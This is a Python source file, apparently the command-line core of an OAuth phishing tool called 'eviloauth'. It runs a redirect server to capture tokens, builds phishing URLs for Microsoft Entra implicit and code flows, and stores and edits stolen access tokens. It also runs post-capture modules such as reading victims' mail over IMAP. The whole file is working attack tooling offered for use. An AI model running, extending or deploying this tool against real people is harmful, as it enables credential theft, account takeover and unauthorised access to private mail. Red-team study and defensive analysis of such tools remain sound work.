import sys
import logging
import argparse
import threading
from datetime import datetime, timedelta
from diskcache import Cache
from .idp import IDP
from prompt_toolkit import PromptSession
from werkzeug.serving import make_server
from . import COMMANDS, app, load_modules, temp_dir, cache
from prompt_toolkit.completion import NestedCompleter
from .exceptions import EviloauthCommandException, EviloauthModuleException
from .access_token import AccessToken

def set_log_level(verbose):
    log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    if verbose == 0:
        logging.basicConfig(level=logging.WARNING, format=log_format)
    elif verbose == 1:
        logging.basicConfig(level=logging.INFO, format=log_format)
    elif verbose >= 2:
        logging.basicConfig(level=logging.DEBUG, format=log_format)

def build_parser():
    parser = argparse.ArgumentParser(prog='eviloauth')
    parser.add_argument('-v', '--verbose', action='count', default=0, help='Increase verbosity level')
    parser.add_argument('-s', '--redirect_server', default='127.0.0.1:5000', help='URI of the redirect server')
    return parser

def shutdown(flask_server):
    print('Exiting...')
    flask_server.shutdown()
    sys.exit()

class TokenManager:
    def __init__(self, cache_dir):
        self.cache = Cache(cache_dir)
        self.authorisation_url = None

    def add(self, raw_token):
        access_token = AccessToken(raw_token)
        token_key = str(access_token)
        self.cache.set(token_key, access_token)
        return token_key

    def delete(self, token_key):
        if token_key in self.cache:
            self.cache.delete(token_key)
            return True
        return False

    def list(self):
        return [key for key in self.cache.iterkeys()]
        
    def update_upn(self, token_key, new_upn):
        token = self.cache.get(token_key)
        if token and not token.is_jwt:  
            new_token_key = f'OAT-{new_upn}'
            token.set_upn(new_upn)
            self.cache.set(new_token_key, token)
            self.cache.delete(token_key)  # Remove the old key
            print(f"UPN and key updated for OAT token. New key: {new_token_key}")
        else:
            print("UPN update is not applicable for JWT tokens.")
    
    def update_scope(self, token_key, new_scope):
        token = self.cache.get(token_key)
        if token and not token.is_jwt:  # Check if it's an OAT token
            token.set_scope(new_scope)
            self.cache.set(token_key, token)
            print(f"Scope updated for OAT token: {token_key}")
        else:
            print("Scope update is not applicable for JWT tokens.")

    def update_expiry(self, token_key, time_str):
        token = self.cache.get(token_key)
        if token and not token.is_jwt:
            try:
                hours = int(time_str[:2])
                minutes = int(time_str[2:])
                new_expiry = datetime.utcnow() + timedelta(hours=hours, minutes=minutes)
                token.set_expiry(new_expiry)
                self.cache.set(token_key, token)
                print(f"Expiry updated to {new_expiry} for OAT token: {token_key}")
            except (ValueError, IndexError):
                print("Invalid time format. Please enter time as HHMM.")
        else:
            print("Expiry update is not applicable for JWT tokens.")     

def main():
    parser = build_parser()
    args = parser.parse_args()
    set_log_level(args.verbose)

    redirect_uri = f'https://{args.redirect_server}/redirect'
    app.config['REDIRECT_URI'] = redirect_uri

    logging.info(f'Redirect Server: {args.redirect_server}')

    from . import routes
    server, port = (args.redirect_server.split(':') + [None, None])[:2]
    port = 443 if port is None else int(port)
    flask_server = make_server(server, port, app, ssl_context='adhoc')
    t = threading.Thread(target=flask_server.serve_forever)
    t.start()

    token_manager = TokenManager(temp_dir)
    completer = NestedCompleter.from_nested_dict(COMMANDS)
    session = PromptSession('evilOAuth# ', completer=completer)
    module_dict = load_modules()

    def display_general_help():
        help_text = """
        EvilOAuth General Help:

        Commands:
        - exit: Exits the application.
        - modules: Manages different modules.
        - tokens: Manages tokens.
        - configure: Configures the Identity Provider.
        - url: Displays the phishing URL.
        - help: Displays help information.

        For detailed help on specific commands, type 'help <command>'.
        """
        print(help_text)

    def display_modules_help():
        help_text = """
        Modules Command Help:

        Usage: modules <module_name> <sub_module_name> <sub_module_action>

        - Runs a specified module.
        - Example: modules read_mail imap read
        """
        print(help_text)

    def display_tokens_help():
        help_text = """
        Tokens Command Help:

        Usage: tokens <subcommand> [<args>]

        Subcommands:
        - list [<token_key>]: Lists all tokens or details of a specific token.
        - set <token_key> <attribute> <value>: Updates attributes of a token.
        - delete <token_key>: Deletes a specified token.

        Attributes for 'set' subcommand:
        - upn: Updates the User Principal Name.
        - scope: Updates the scope.
        - expiry: Updates the expiry time in HHMM format.

        Example: tokens set OAT-example upn new-upn@example.com
        """
        print(help_text)

    def display_configure_help():
        help_text = """
        Configure Command Help:

        Usage: configure idp <idp_name>

        - Configures the Identity Provider.
        - Supported IDPs: entra_implicit_flow, entra_code_flow
        - Example: configure idp entra_implicit_flow
        """
        print(help_text)

    def display_url_help():
        help_text = """
        URL Command Help:

        Usage: url

        - Displays the phishing URL if set.
        - Requires running 'configure idp' command first.
        """
        print(help_text)

    try:
        while True:
            command_input = session.prompt()
            cmd_parts = command_input.strip().split()
            cmd = cmd_parts[0].lower() if cmd_parts else None
            cmd_args = cmd_parts[1:]

            if cmd == 'exit':
                shutdown(flask_server)

            elif cmd == 'modules':
                if len(cmd_args) >= 3:
                    mod_key = f'eviloauth.modules.{cmd_args[0]}.{cmd_args[1]}.{cmd_args[2]}'
                    mod = module_dict.get(mod_key, None)
                    if mod:
                        mod.__run__(token_manager.list(), 0)
                    else:
                        logging.warning(f'Module not found: {mod_key}')
                else:
                    logging.warning('Invalid module command syntax')

            elif cmd == 'tokens':
                if len(cmd_args) >= 1:
                    if cmd_args[0] == 'list':
                        if len(cmd_args) > 1:
                            token_key = cmd_args[1]
                            token_obj = token_manager.cache.get(token_key)
                            if token_obj:
                                print(f"Details for token {token_key}:")
                                print(f"  User Principal Name (UPN): {getattr(token_obj, 'upn', 'N/A')}")
                                print(f"  Scope: {getattr(token_obj, 'scp', 'N/A')}")
                                print(f"  Expiry: {token_obj.get_time_until_expiry()}")
                                print(f"  Issued at: {getattr(token_obj, 'time', 'N/A')} on {getattr(token_obj, 'today', 'N/A')}")
                            else:
                                print(f"No token found for key: {token_key}")
                        else:
                            token_keys = token_manager.list()
                            print("Available token keys:")
                            for key in token_keys:
                                print(key)
                    elif len(cmd_args) >= 4 and cmd_args[1] == 'set':
                        token_key = cmd_args[0]
                        action = cmd_args[2]
                        if action == 'upn':
                            new_upn = cmd_args[3]
                            token_manager.update_upn(token_key, new_upn)
                        elif action == 'scope':
                            new_scope = cmd_args[3]
                            token_manager.update_scope(token_key, new_scope)
                        elif action == 'expiry':
                            if len(cmd_args[3]) == 4 and cmd_args[3].isdigit():
                                new_expiry = cmd_args[3]
                                token_manager.update_expiry(token_key, new_expiry)
                            else:
                                print("Invalid time format. Please enter time as HHMM.")
                        else:
                            print(f"Invalid format for 'add {action}' subcommand.")
                    
                    elif len(cmd_args) == 2 and cmd_args[0] == 'delete':
                        token_key = cmd_args[1]
                        if token_manager.delete(token_key):
                            print(f"Token {token_key} deleted successfully.")
                        else:
                            print(f"Token {token_key} not found or could not be deleted.")

                    else:
                        print(f"Invalid or unrecognised subcommand: {cmd_args[0]}")

            elif cmd == 'configure':
                if len(cmd_args) >= 2 and cmd_args[0] == 'idp':
                    idp_name = cmd_args[1]
                    app.idp_instance = IDP(idp_name, redirect_uri)
                else:
                    logging.warning('Invalid configure command syntax')
            
            elif cmd == 'url':
                if hasattr(app, 'idp_instance') and app.idp_instance is not None:
                    phishing_url = app.idp_instance.get_phishing_url()
                    print(f"Phishing URL:\n{phishing_url}")
                else:
                    print("Phishing URL not set. Please run 'configure idp' first.")
                    
            elif cmd == 'help':
                if not cmd_args or len(cmd_args) == 0:
                    display_general_help()
                elif cmd_args[0] == 'modules':
                    display_modules_help()
                elif cmd_args[0] == 'tokens':
                    display_tokens_help()
                elif cmd_args[0] == 'configure':
                    display_configure_help()
                elif cmd_args[0] == 'url':
                    display_url_help()
                else:
                    print(f"No specific help available for '{cmd_args[0]}'")

            else:
                logging.error(f'Unknown command {cmd}' if cmd else 'No command entered')

    except KeyboardInterrupt:
        shutdown(flask_server)

if __name__ == '__main__':
    main()